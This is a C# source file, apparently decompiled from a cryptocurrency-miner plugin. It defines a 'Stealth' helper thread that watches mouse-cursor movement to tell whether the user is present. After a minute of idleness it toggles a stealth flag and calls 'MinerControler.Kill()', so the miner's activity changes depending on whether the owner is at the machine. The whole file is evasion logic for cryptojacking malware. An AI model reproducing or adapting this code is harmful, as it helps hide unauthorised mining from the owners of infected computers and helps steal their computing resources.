using System;
using System.Security.Permissions;
using System.Threading;
using System.Windows.Forms;

namespace Plugin.Helper;

internal class Stealth
{
	private static Thread StealhThread = new Thread(StealthMode);

	private static int Lastx = 0;

	private static int Lasty = 0;

	private static DateTime LastUpdate = DateTime.Now;

	public static bool Enabled { get; set; } = false;


	public static bool StealthModeuse { get; set; } = false;


	public static void Start()
	{
		if (!Enabled)
		{
			Enabled = true;
			StealhThread.Start();
		}
	}

	[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
	public static void Stop()
	{
		if (!Enabled)
		{
			return;
		}
		Enabled = false;
		try
		{
			StealhThread.Abort();
			StealhThread = new Thread(StealthMode);
		}
		catch
		{
		}
	}

	private static double DiffMinutes(DateTime startTime, DateTime endTime)
	{
		return Math.Abs(new TimeSpan(endTime.Ticks - startTime.Ticks).TotalMinutes);
	}

	public static void StealthMode()
	{
		while (Enabled)
		{
			int x = Cursor.Position.X;
			int y = Cursor.Position.Y;
			if (x != Lastx || y != Lasty)
			{
				Lastx = x;
				Lasty = y;
				LastUpdate = DateTime.Now;
			}
			if (DiffMinutes(LastUpdate, DateTime.Now) > 1.0)
			{
				if (!StealthModeuse)
				{
					StealthModeuse = true;
					MinerControler.Kill();
				}
			}
			else if (StealthModeuse)
			{
				StealthModeuse = false;
				MinerControler.Kill();
			}
			Thread.Sleep(500);
		}
	}
}
